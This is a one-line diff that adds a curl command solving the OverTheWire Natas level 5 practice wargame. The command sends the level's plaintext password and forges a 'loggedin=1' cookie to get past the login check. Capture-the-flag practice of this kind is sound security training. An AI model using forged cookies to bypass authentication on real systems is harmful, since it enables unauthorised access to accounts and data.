@@ -1,0 +1,1 @@
+curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie loggedin=1 http://natas5.natas.labs.overthewire.org
